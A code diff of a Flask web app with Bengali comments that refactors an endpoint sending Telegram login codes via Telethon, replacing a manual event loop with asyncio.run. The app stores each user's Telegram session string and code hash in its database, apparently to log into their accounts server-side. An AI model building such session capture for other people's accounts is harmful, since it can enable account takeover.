@@ -1,4 +1,4 @@
-import os, asyncio, requests, time, random, threading
+import os, requests, time, random, threading
 from datetime import datetime, timedelta
 from functools import wraps
 from flask import Flask, render_template, request, jsonify, session, redirect, url_for
@@ -56,6 +56,8 @@ def get_admin_settings():
 # ---------------------------------------------------------
 # ৩. API রুটস
 # ---------------------------------------------------------
+import asyncio # নিশ্চিত করুন ফাইলের একদম উপরে এটি আছে
+
 @app.route('/api/send_otp', methods=['POST'])
 def send_otp_handler():
     data = request.json
@@ -63,38 +65,41 @@ def send_otp_handler():
     
     print(f"DEBUG SEND OTP: Attempting for {phone}")
 
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
+    # একটি ইন্টারনাল এ্যাসিনক্রোনাস ফাংশন তৈরি করা
+    async def main():
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        
+        try:
+            # ওটিপি রিকোয়েস্ট পাঠানো
+            result = await client.send_code_request(phone)
+            
+            # ডাটাবেজে সেভ
+            users_col.update_one(
+                {"phone": phone},
+                {"$set": {
+                    "temp_session": client.session.save(),
+                    "phone_code_hash": result.phone_code_hash,
+                    "auth_pending": True
+                }},
+                upsert=True
+            )
+            return True, "Success"
+        except Exception as e:
+            return False, str(e)
+        finally:
+            await client.disconnect()
 
     try:
-        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
-        
-        # এখানে পরিবর্তন: run_until_complete ব্যবহার করা হয়েছে
-        loop.run_until_complete(client.connect())
-        
-        # ওটিপি রিকোয়েস্ট (পরিবর্তন করা হয়েছে)
-        result = loop.run_until_complete(client.send_code_request(phone))
-        
-        # ডাটাবেজে সেভ
-        users_col.update_one(
-            {"phone": phone},
-            {"$set": {
-                "temp_session": client.session.save(),
-                "phone_code_hash": result.phone_code_hash,
-                "auth_pending": True
-            }},
-            upsert=True
-        )
-        
-        loop.run_until_complete(client.disconnect()) 
-        return jsonify({"success": True})
-        
-    except Exception as e:
-        print(f"OTP Error: {str(e)}")
-        return jsonify({"success": False, "message": str(e)})
-    finally:
-        # লুপ বন্ধ করা জরুরি
-        loop.close()
+        # এখানে asyncio.run ব্যবহার করা হয়েছে যা সব জটিলতা দূর করবে
+        success, message = asyncio.run(main())
+        if success:
+            return jsonify({"success": True})
+        else:
+            return jsonify({"success": False, "message": message})
+    except Exception as fatal_e:
+        print(f"Fatal Error: {str(fatal_e)}")
+        return jsonify({"success": False, "message": "Server Busy, try again!"})
                 
 @app.route('/api/verify_login', methods=['POST'])
 def verify_login_handler():
